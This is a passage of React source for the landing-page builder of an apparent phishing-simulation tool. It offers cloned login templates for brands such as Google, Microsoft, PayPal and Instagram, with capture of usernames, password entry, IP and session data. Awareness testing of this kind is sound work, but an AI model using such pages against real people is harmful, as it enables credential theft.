"use client";

import { useState, useEffect, useRef, useMemo } from "react";
import { motion } from "framer-motion";
import {
  Globe, Plus, Code, LayoutTemplate, Trash2, CheckCircle2, Upload,
  ArrowLeft, Loader2, Save, Edit3, Monitor, AlertCircle, Download,
  Rocket, Share2, MoveRight
} from "lucide-react";
import api from "@/lib/api";
import VisualEditor from "@/components/VisualEditor";

const ALL_CAPTURE_FIELDS = [
  { id: "email",     label: "Email / Username",     desc: "Captures submitted email or username" },
  { id: "password",  label: "Password field",        desc: "Flags that a password was entered (not stored in plaintext)" },
  { id: "timestamp", label: "Submission timestamp",  desc: "Server-side time of form submit" },
  { id: "ip",        label: "IP address",            desc: "Visitor's IP address" },
  { id: "session",   label: "Session metadata",      desc: "Browser user-agent and session ID" },
];

const TEMPLATE_META = [
  { id: "instagram", name: "Instagram", file: "instagram.html" },
  { id: "x", name: "X", file: "x.html" },
  { id: "github", name: "GitHub", file: "github.html" },
  { id: "facebook", name: "Facebook", file: "facebook.html" },
  { id: "google", name: "Google", file: "google.html" },
  { id: "microsoft", name: "Microsoft", file: "microsoft.html" },
  { id: "netflix", name: "Netflix", file: "netflix.html" },
  { id: "paypal", name: "PayPal", file: "paypal.html" },
  { id: "tiktok", name: "TikTok", file: "tiktok.html" },
  { id: "discord", name: "Discord", file: "discord.html" },
] as const;

type TemplateId = typeof TEMPLATE_META[number]["id"];
type Tab = "templates" | "upload" | "editor";
type View = "list" | "build";

interface LandingPage {
  id: number;
  name: string;
  html_content: string;
  capture_fields?: string | null;
  source_url?: string | null;
  import_type?: string | null;
  import_status?: string | null;
  error_message?: string | null;
  asset_count?: number | null;
}

function TemplateBrand({ id, className }: { id: TemplateId; className?: string }) {
  if (id === "x") {
    return (
      <svg className={className} viewBox="0 0 24 24" fill="#ffffff" aria-hidden="true">
        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
      </svg>
    );
  }
  if (id === "github") {
    return (
      <svg className={className} viewBox="0 0 24 24" fill="#ffffff" aria-hidden="true">
        <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" />
      </svg>
    );
  }
  if (id === "facebook") {
    return (
      <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
        <path fill="#1877F2" d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.026 1.792-4.697 4.533-4.697 1.313 0 2.686.236 2.686.236v2.971H15.83c-1.491 0-1.956.93-1.956 1.886v2.264h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073" />
      </svg>
    );
  }
  if (id === "google") {
    return (
      <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
        <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47c-.29 1.48-1.14 2.73-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
        <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09C3.26 21.3 7.31 24 12 24z" />
        <path fill="#FBBC05" d="M5.27 14.29A7.21 7.21 0 0 1 4.82 12c0-.84.16-1.65.45-2.41V6.5H1.29A12.06 12.06 0 0 0 0 12c0 1.94.46 3.77 1.29 5.5l3.98-3.21z" />
        <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.26 2.7 1.29 6.5l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
      </svg>
    );
  }
  if (id === "microsoft") {
    return (
      <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
        <rect x="1.5" y="1.5" width="10" height="10" fill="#F25022" />
        <rect x="12.5" y="1.5" width="10" height="10" fill="#7FBA00" />
        <rect x="1.5" y="12.5" width="10" height="10" fill="#00A4EF" />
        <rect x="12.5" y="12.5" width="10" height="10" fill="#FFB900" />
      </svg>
    );
  }
  if (id === "netflix") {
    return (
      <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
        <rect x="1" y="1" width="22" height="22" rx="5" fill="#0b0b0b" />
        <path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z" fill="#E50914" />
      </svg>
    );
  }
  if (id === "paypal") {
    return (
      <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
        <rect x="1" y="1" width="22" height="22" rx="5" fill="#ffffff" />
        <path fill="#003087" d="M15.607 4.653H8.941L6.645 19.251H1.82L4.862 0h7.995c3.754 0 6.375 2.294 6.473 5.513-.648-.478-2.105-.86-3.722-.86m6.57 5.546c0 3.41-3.01 6.853-6.958 6.853h-2.493L11.595 24H6.74l1.845-11.538h3.592c4.208 0 7.346-3.634 7.153-6.949a5.24 5.24 0 0 1 2.848 4.686M9.653 5.546h6.408c.907 0 1.942.222 2.363.541-.195 2.741-2.655 5.483-6.441 5.483H8.714Z" />
      </svg>
    );
  }
  if (id === "tiktok") {
    return (
      <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
        <rect x="1" y="1" width="22" height="22" rx="5" fill="#000000" />
        <path fill="#FE2C55" d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z" transform="translate(0.35 0.35)" />
        <path fill="#25F4EE" d="M12.5.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z" transform="translate(-0.35 -0.35)" />
        <path fill="#ffffff" d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z" />
      </svg>
    );
  }
  if (id === "discord") {
    return (
      <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
        <rect x="1" y="1" width="22" height="22" rx="5" fill="#5865F2" />
        <path fill="#fff" d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z" />
      </svg>
    );
  }
  return (
    <svg className={className} viewBox="0 0 24 24" aria-hidden="true">
      <defs>
        <linearGradient id="ig-grad" x1="0" y1="0" x2="1" y2="1">
          <stop offset="0" stopColor="#F58529" />
          <stop offset="0.25" stopColor="#DD2A7B" />
          <stop offset="0.6" stopColor="#8134AF" />
          <stop offset="1" stopColor="#515BD4" />
        </linearGradient>
      </defs>
      <rect x="1" y="1" width="22" height="22" rx="5" fill="url(#ig-grad)" />
      <rect x="3.5" y="3.5" width="17" height="17" rx="4.5" fill="none" stroke="#fff" strokeWidth="1.5" />
      <circle cx="12" cy="12" r="3.6" fill="none" stroke="#fff" strokeWidth="1.5" />
      <circle cx="17" cy="7" r="1.3" fill="#fff" />
    </svg>
  );
}

// For the full-page live preview: strip the capture script (so previewing never
// records a capture). The preview viewport is locked to the ratio chosen in the
// Visual Editor, so no content measuring is needed.
function buildFitPreviewDoc(html: string): string {
  return html.replace(/<script data-phishhunt="capture">[\s\S]*?<\/script>/gi, "");
}

// Minimal shape of the flow nodes the Visual Editor reports back after a save.
type SavedFlowNode = {
  id: string;
  type: string;
  x: number;
  data?: Record<string, any>;
};
type SavedFlowConnection = {
  sourceNodeId: string;
  sourceButtonSelector?: string;
  targetNodeId: string;
  type?: string;
};

/** The entry page of a saved flow: a preview/new_page node with no incoming
 *  page-chain connection (leftmost wins). DF pipes never chain pages. */
function entryNodeOf(nodes: SavedFlowNode[], connections: SavedFlowConnection[]): SavedFlowNode | null {
  const pageNodes = nodes.filter((n) => n.type === "preview" || n.type === "new_page");
  if (pageNodes.length === 0) return null;
  const incoming = new Set<string>();
  connections.forEach((c) => {
    if (c.type === "df") return;
    if (!c.sourceButtonSelector) incoming.add(c.targetNodeId);
  });
  const candidates = pageNodes.filter((n) => !incoming.has(n.id)).sort((a, b) => a.x - b.x);
  return candidates[0] || pageNodes.find((n) => n.type === "preview") || pageNodes[0];
}

export default function LandingPages() {
  const [pages, setPages] = useState<LandingPage[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [view, setView] = useState<View>("list");
  const [editingPage, setEditingPage] = useState<LandingPage | null>(null);

  // Builder state
  const [name, setName] = useState("");
  const [activeTab, setActiveTab] = useState<Tab>("templates");
  const [htmlContent, setHtmlContent] = useState("");
  const [captureFields, setCaptureFields] = useState<string[]>(["email", "password", "timestamp", "ip", "session"]);
  const [selectedTemplate, setSelectedTemplate] = useState<TemplateId | null>(null);
  const [templateAvailability, setTemplateAvailability] = useState<Record<string, boolean>>({});
  const [isBuilding, setIsBuilding] = useState(false);
  const [isSaving, setIsSaving] = useState(false);
  const [fetchError, setFetchError] = useState("");
  const [successMsg, setSuccessMsg] = useState("");
  const [deleteConfirm, setDeleteConfirm] = useState<number | null>(null);
  const [showVisualEditor, setShowVisualEditor] = useState(false);

  // ── .phe project share (import / export) ──
  const [showImportModal, setShowImportModal] = useState(false);
  const [importBusy, setImportBusy] = useState(false);
  const [importMsg, setImportMsg] = useState<{ text: string; error: boolean } | null>(null);
  const [importFolder, setImportFolder] = useState("");
  const importFileRef = useRef<File | null>(null);
  const [exportBusy, setExportBusy] = useState(false);

  const fileInputRef = useRef<HTMLInputElement>(null);

  // Live preview: locked to the page ratio chosen in the Visual Editor so the
  // panel shows the page in exactly the same aspect (16:9 or 9:16).
  const [previewRatio, setPreviewRatio] = useState<"16:9" | "9:16">("16:9");
  const [, setPreviewTick] = useState(0);
  const previewWrapRef = useRef<HTMLDivElement>(null);
  const previewDims =
    previewRatio === "9:16" ? { w: 720, h: 1280 } : { w: 1280, h: 720 };
  const previewDoc = useMemo(
    () => (htmlContent ? buildFitPreviewDoc(htmlContent) : ""),
    [htmlContent]
  );

  // Re-measure whenever the panel layout changes (view switches, sidebar,
  // editor overlay closing) so the preview scale is never stale — otherwise the
  // page renders at an old scale (too big / cropped) after returning here.
  useEffect(() => {
    if (view !== "build") return;
    const onResize = () => setPreviewTick((t) => t + 1);
    window.addEventListener("resize", onResize);
    const el = previewWrapRef.current;
    let ro: ResizeObserver | null = null;
    if (el && typeof ResizeObserver !== "undefined") {
      ro = new ResizeObserver(onResize);
      ro.observe(el);
    }
    return () => {
      window.removeEventListener("resize", onResize);
      ro?.disconnect();
    };
  }, [view]);

  const previewPanel = previewWrapRef.current?.getBoundingClientRect();
  // CONTAIN scale: the whole ratio-locked page stays visible (16:9 or 9:16),
  // scaled as large as the panel allows — the leftover letterbox is kept to the
  // absolute minimum the panel's own aspect permits.
  const previewScale =
    previewPanel && previewPanel.width > 0
      ? Math.min(previewPanel.width / previewDims.w, previewPanel.height / previewDims.h)
      : 1;

  const fetchPages = async () => {
    setIsLoading(true);
    try {
      const res = await api.get("/landing-pages/");
      setPages(res.data);
    } catch (err) {
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => { fetchPages(); }, []);

  // ── .phe export: compile the current page's whole editor state (pages,
  //    panels, positions, notes, urls, strings, DF marks & pipes) into ONE
  //    shareable .phe file and download it.
  const handleExportPhe = async () => {
    if (!editingPage?.id) return;
    setExportBusy(true);
    setFetchError("");
    try {
      const res = await api.get(`/landing-pages/${editingPage.id}/export-phe`, {
        responseType: "blob",
      });
      const disp: string = res.headers?.["content-disposition"] || "";
      const m = /filename="?([^";]+)"?/.exec(disp);
      const fileName = m?.[1] || `${editingPage.name || "project"}.phe`;
      const url = URL.createObjectURL(res.data as Blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = fileName;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
      setSuccessMsg(`Exported ${fileName} — share it! Anyone can Import it to rebuild this exact flow.`);
      setTimeout(() => setSuccessMsg(""), 5000);
    } catch (err: any) {
      const detail = err?.response?.data?.detail;
      setFetchError(detail || "Failed to export the .phe file.");
    } finally {
      setExportBusy(false);
    }
  };

  // ── .phe import: rebuild the shared project as a NEW landing page + flow and
  //    decompile every page's .html into the folder the user typed.
  const handleImportPhe = async () => {
    const file = importFileRef.current;
    if (!file) {
      setImportMsg({ text: "Pick a .phe project file first.", error: true });
      return;
    }
    setImportBusy(true);
    setImportMsg(null);
    try {
      const fd = new FormData();
      fd.append("file", file);
      fd.append("folder_path", importFolder.trim());
      const res = await api.post("/landing-pages/import-phe", fd, {
        headers: { "Content-Type": "multipart/form-data" },
      });
      const data = res.data as {
        page: LandingPage;
        extracted_files: string[];
        extract_dir: string;
      };
      await fetchPages();
      setSuccessMsg(
        `Imported "${data.page.name}"` +
          (data.extracted_files.length
            ? ` — extracted ${data.extracted_files.length} HTML file(s) to ${data.extract_dir}`
            : "")
      );
      setTimeout(() => setSuccessMsg(""), 6000);
      setShowImportModal(false);
      importFileRef.current = null;
      setImportFolder("");
      openBuilder(data.page);
    } catch (err: any) {
      const detail = err?.response?.data?.detail;
      let text = "Failed to import the .phe file.";
      if (typeof detail === "string") {
        text = detail;
      } else if (Array.isArray(detail)) {
        text = detail.map((d: any) => d.msg).join(", ");
      }
      setImportMsg({ text, error: true });
    } finally {
      setImportBusy(false);
    }
  };

  useEffect(() => {
    api.get("/landing-pages/templates")
      .then((res) => {
        const availability: Record<string, boolean> = {};
        (res.data || []).forEach((t: any) => { availability[t.id] = Boolean(t.available); });
        setTemplateAvailability(availability);
      })
      .catch(() => {
        setTemplateAvailability({ instagram: true });
      });
  }, []);

  const openBuilder = (page?: LandingPage) => {
    if (page) {
      setEditingPage(page);
      setName(page.name);
      setHtmlContent(page.html_content);
      try {
        setCaptureFields(page.capture_fields ? JSON.parse(page.capture_fields) : ["email", "password", "timestamp", "ip", "session"]);
      } catch { setCaptureFields(["email", "password", "timestamp", "ip", "session"]); }
      setSelectedTemplate(null);
      setActiveTab("editor");
      // Sync the live preview to THIS page's saved entry (latest starting page
      // + its ratio), so reopening a page shows exactly what was saved — the
      // same rendered state it had on first import.
      api.get(`/landing-pages/${page.id}/flow`)
        .then((res) => {
          const entry = entryNodeOf((res.data?.nodes || []) as SavedFlowNode[], (res.data?.connections || []) as SavedFlowConnection[]);
          if (!entry) return;
          const html =
            entry.type === "preview"
              ? page.html_content || ""
              : ((entry.data?.htmlContent as string) || page.html_content || "");
          if (html) setHtmlContent(html);
          setPreviewRatio(entry.data?.ratio === "9:16" ? "9:16" : "16:9");
        })
        .catch(() => {});
    } else {
      setEditingPage(null);
      setName("");
      setHtmlContent("");
      setPreviewRatio("16:9");
      setCaptureFields(["email", "password", "timestamp", "ip", "session"]);
      setSelectedTemplate(null);
      setActiveTab("templates");
    }
    setFetchError("");
    setSuccessMsg("");
    setView("build");
  };

  const isTemplateAvailable = (id: string) => templateAvailability[id] ?? id === "instagram";

  const handleBuild = async () => {
    if (!name || !selectedTemplate) return;
    setIsBuilding(true);
    setFetchError("");
    try {
      const res = await api.post("/landing-pages/build", {
        name,
        template_id: selectedTemplate,
        capture_fields: captureFields,
      });
      setEditingPage(res.data);
      setHtmlContent(res.data.html_content);
      setSuccessMsg("Landing page built successfully!");
      setTimeout(() => setSuccessMsg(""), 4000);
      fetchPages();
      // Switch to editor so the user can review/tweak the generated HTML
      setActiveTab("editor");
    } catch (err: any) {
      const status = err?.response?.status;
      const detail = err?.response?.data?.detail;
      if (status === 401) {
        setFetchError("Session expired. Please log in again.");
      } else if (detail) {
        setFetchError(detail);
      } else if (err?.code === "ERR_NETWORK" || !err?.response) {
        setFetchError("Cannot reach the backend server. Make sure it is running on port 8000.");
      } else {
        setFetchError("Failed to build page. Try the Upload HTML tab instead.");
      }
    } finally {
      setIsBuilding(false);
    }
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
      const content = ev.target?.result as string;
      setHtmlContent(content);
      if (!name) setName(file.name.replace(/\.html?$/i, ""));
      setActiveTab("editor");
    };
    reader.readAsText(file);
  };

  const toggleCaptureField = (fieldId: string) => {
    setCaptureFields(prev =>
      prev.includes(fieldId) ? prev.filter(f => f !== fieldId) : [...prev, fieldId]
    );
  };

  const handleSave = async () => {
    if (!name || !htmlContent) return;
    setIsSaving(true);
    try {
      if (editingPage) {
        await api.put(`/landing-pages/${editingPage.id}`, {
          name,
          html_content: htmlContent,
          capture_fields: captureFields,
          source_url: editingPage.source_url || null,
        });
        setSuccessMsg("Page updated successfully!");
      } else {
        await api.post("/landing-pages/", {
          name,
          html_content: htmlContent,
          capture_fields: captureFields,
        });
        setSuccessMsg("Page saved successfully!");
      }
      setTimeout(() => setSuccessMsg(""), 3000);
      fetchPages();
      setView("list");
    } catch (err: any) {
      setFetchError(err.response?.data?.detail || "Failed to save page");
    } finally {
      setIsSaving(false);
    }
  };

  const handleDelete = async (id: number) => {
    try {
      await api.delete(`/landing-pages/${id}`);
      setPages(prev => prev.filter(p => p.id !== id));
      setDeleteConfirm(null);
    } catch (err) {
      console.error(err);
    }
  };

  const isTemplateTab = activeTab === "templates";
  const canBuild = isTemplateTab && !!name && !!selectedTemplate;
  const canSave = !isTemplateTab && !!name && !!htmlContent;

  // ───── LIST VIEW ─────
  if (view === "list") {
    return (
      <div className="p-8 w-full max-w-7xl mx-auto space-y-6">
        <div className="flex justify-between items-end">
          <div>
            <h1 className="text-3xl font-bold tracking-tight text-white mb-2">Landing Pages</h1>
            <p className="text-zinc-400">Build and manage phishing simulation pages.</p>
          </div>
          <button
            onClick={() => openBuilder()}
            className="flex items-center gap-2 px-5 py-2.5 bg-red-600 hover:bg-red-700 text-white rounded-xl font-medium transition-all shadow-lg shadow-red-900/20 text-sm"
          >
            <Plus className="w-4 h-4" />
            New Page
          </button>
        </div>

        {isLoading ? (
          <div className="flex justify-center py-24">
            <Loader2 className="w-8 h-8 text-red-500 animate-spin" />
          </div>
        ) : pages.length === 0 ? (
          <div className="bg-zinc-950 border border-zinc-800 border-dashed rounded-2xl p-16 flex flex-col items-center justify-center text-center">
            <div className="w-16 h-16 bg-zinc-900 rounded-full flex items-center justify-center mb-4">
              <LayoutTemplate className="w-8 h-8 text-zinc-600" />
            </div>
            <h3 className="text-xl font-semibold text-white mb-2">No landing pages yet</h3>
            <p className="text-zinc-500 mb-6 max-w-sm text-sm">Create your first page from a template, upload HTML, or write from scratch.</p>
            <button
              onClick={() => openBuilder()}
              className="px-6 py-3 bg-red-600 hover:bg-red-700 text-white rounded-xl font-medium transition-colors text-sm"
            >
              Create Your First Page
            </button>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
            {pages.map((page, i) => (
              <motion.div
                key={page.id}
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.05 }}
                className="bg-zinc-950 border border-zinc-800 rounded-2xl overflow-hidden group hover:border-zinc-700 transition-all flex flex-col"
              >
                {/* Mini preview */}
                <div className="h-36 bg-zinc-900 relative border-b border-zinc-800 overflow-hidden">
                  <iframe
                    srcDoc={page.html_content}
                    className="w-[1200px] h-[700px] scale-[0.24] origin-top-left pointer-events-none"
                    sandbox=""
                    tabIndex={-1}
                  />
                  <div className="absolute inset-0 bg-gradient-to-b from-transparent to-zinc-900/60" />
                  {page.source_url && (
                    <div className="absolute bottom-2 left-2 flex items-center gap-1.5 bg-zinc-900/80 backdrop-blur-sm px-2 py-1 rounded-md">
                      <Globe className="w-3 h-3 text-zinc-400" />
                      <span className="text-[10px] text-zinc-400 font-mono truncate max-w-[140px]">{page.source_url}</span>
                    </div>
                  )}
                </div>

                <div className="p-4 flex-1 flex flex-col gap-3">
                  <div>
                    <h3 className="font-semibold text-white line-clamp-1">{page.name}</h3>
                    <p className="text-xs text-zinc-600 mt-0.5">ID #{page.id}</p>
                    {page.import_status === "error" && (
                      <p className="text-[11px] text-red-500 mt-1 flex items-center gap-1">
                        <AlertCircle className="w-3 h-3 shrink-0" />
                        {page.error_message || "Import failed"}
                      </p>
                    )}
                    {page.import_status === "ready" && page.asset_count != null && (
                      <p className="text-[11px] text-zinc-600 mt-1">
                        {page.asset_count} asset{page.asset_count === 1 ? "" : "s"} imported
                      </p>
                    )}
                  </div>

                  {/* Capture field chips */}
                  {page.capture_fields && (() => {
                    try {
                      const fields: string[] = JSON.parse(page.capture_fields);
                      return (
                        <div className="flex flex-wrap gap-1">
                          {fields.map(f => (
                            <span key={f} className="text-[10px] px-2 py-0.5 bg-zinc-900 border border-zinc-800 text-zinc-400 rounded-full font-mono">
                              {f}
                            </span>
                          ))}
                        </div>
                      );
                    } catch { return null; }
                  })()}

                  <div className="mt-auto flex gap-2">
                    <button
                      onClick={() => openBuilder(page)}
                      className="flex-1 py-2 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 hover:text-white rounded-lg text-sm font-medium flex items-center justify-center gap-1.5 transition-colors"
                    >
                      <Edit3 className="w-3.5 h-3.5" />
                      Edit
                    </button>
                    <button
                      onClick={() => {
                        window.open(
                          `${api.defaults.baseURL}/landing-pages/${page.id}/download`,
                          "_blank"
                        );
                      }}
                      className="p-2 bg-zinc-900 hover:bg-zinc-800 text-zinc-500 hover:text-zinc-300 rounded-lg transition-colors"
                      title="Download HTML"
                    >
                      <Download className="w-4 h-4" />
                    </button>
                    <button
                      onClick={() => {
                        window.open(`${window.location.origin}/build/${page.id}`, "_blank");
                      }}
                      className="p-2 bg-zinc-900 hover:bg-zinc-800 text-zinc-500 hover:text-zinc-300 rounded-lg transition-colors"
                      title={`Share — opens /build/${page.id} in a new tab`}
                    >
                      <Share2 className="w-4 h-4" />
                    </button>
                    {deleteConfirm === page.id ? (
                      <div className="flex gap-1">
                        <button
                          onClick={() => handleDelete(page.id)}
                          className="px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-xs font-medium transition-colors"
                        >
                          Confirm
                        </button>
                        <button
                          onClick={() => setDeleteConfirm(null)}
                          className="px-3 py-2 bg-zinc-800 text-zinc-400 rounded-lg text-xs font-medium transition-colors"
                        >
                          Cancel
                        </button>
                      </div>
                    ) : (
                      <button
                        onClick={() => setDeleteConfirm(page.id)}
                        className="p-2 bg-zinc-900 hover:bg-red-950/50 hover:text-red-500 text-zinc-500 rounded-lg transition-colors"
                        title="Delete page"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    )}
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        )}
      </div>
    );
  }

  // ───── BUILD / EDIT VIEW ─────
  return (
    <div className="h-screen flex flex-col overflow-hidden">
      {/* Top bar */}
      <div className="flex items-center gap-4 px-6 py-4 border-b border-zinc-800 bg-zinc-950 shrink-0">
        <button
          onClick={() => setView("list")}
          className="flex items-center gap-2 text-zinc-400 hover:text-white transition-colors text-sm"
        >
          <ArrowLeft className="w-4 h-4" />
          Back
        </button>
        <div className="w-px h-5 bg-zinc-800" />
        <h2 className="text-white font-semibold text-sm">
          {editingPage ? "Edit Landing Page" : "New Landing Page"}
        </h2>

        {successMsg && (
          <motion.div
            initial={{ opacity: 0, x: 10 }}
            animate={{ opacity: 1, x: 0 }}
            className="ml-auto flex items-center gap-2 text-emerald-400 text-sm"
          >
            <CheckCircle2 className="w-4 h-4" />
            {successMsg}
          </motion.div>
        )}
      </div>

      {/* Main split layout */}
      <div className="flex flex-1 overflow-hidden">
        {/* ── Left Panel (form) ── */}
        <div className="w-[420px] shrink-0 border-r border-zinc-800 bg-[#0a0a0b] flex flex-col overflow-y-auto">
          <div className="p-5 space-y-5 flex-1">

            {/* Page name */}
            <div>
              <label className="block text-xs font-semibold text-zinc-400 uppercase tracking-widest mb-2">
                Page name
              </label>
              <input
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="e.g. Instagram Login Clone"
                className="w-full px-4 py-2.5 bg-zinc-900 border border-zinc-800 rounded-xl text-white text-sm focus:ring-2 focus:ring-red-500/40 focus:outline-none focus:border-red-500/50 placeholder:text-zinc-600"
              />
            </div>

            {/* Tab bar */}
            <div>
              <div className="flex rounded-xl bg-zinc-900 border border-zinc-800 p-1 gap-1">
                {([
                  { id: "templates", icon: LayoutTemplate, label: "Templates" },
                  { id: "upload",    icon: Upload,         label: "Upload HTML" },
                  { id: "editor",    icon: Code,           label: "Custom Editor" },
                ] as { id: Tab; icon: any; label: string }[]).map(({ id, icon: Icon, label }) => (
                  <button
                    key={id}
                    onClick={() => setActiveTab(id)}
